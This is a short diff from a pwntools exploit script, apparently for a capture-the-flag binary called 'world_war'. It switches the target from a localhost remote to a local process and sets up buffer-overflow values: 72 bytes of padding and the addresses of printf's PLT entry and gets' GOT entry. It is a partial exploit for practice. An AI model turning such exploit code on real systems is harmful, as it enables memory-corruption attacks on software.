@@ -2,8 +2,9 @@ from pwn import *
 
 def exploit():
     binary = ELF("./world_war")
-    p = remote("127.0.0.1", 8888)
-    
+    #p = remote("127.0.0.1", 8888)
+    p = process("./world_war")    
+
     padding = 72
     printf_plt = p32(binary.symbols["plt.printf"])
     gets_got = p32(binary.symbols["got.gets"])
